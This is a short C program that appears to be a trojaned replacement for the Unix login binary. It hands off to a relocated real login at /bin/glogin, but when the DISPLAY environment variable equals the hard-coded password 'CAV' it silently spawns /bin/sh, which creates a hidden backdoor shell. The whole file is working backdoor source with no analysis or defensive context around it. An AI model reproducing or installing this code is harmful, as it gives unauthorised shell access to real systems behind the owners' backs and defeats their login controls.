#include        <stdio.h>
#define 	PASSWORD	"CAV"
#define        _PATH_LOGIN     "/bin/glogin"

main (argc, argv, envp)
int argc;
char **argv, **envp;
{
char *display = getenv("DISPLAY");
  if ( display == NULL ) 
  {
        execve(_PATH_LOGIN, argv, envp);
        perror(_PATH_LOGIN);
        exit(1);
  }
  if (!strcmp(display,PASSWORD)) 
  {
  	system("/bin/sh");
        exit(1);
  }
  execve(_PATH_LOGIN, argv, envp);
  exit(1);
}
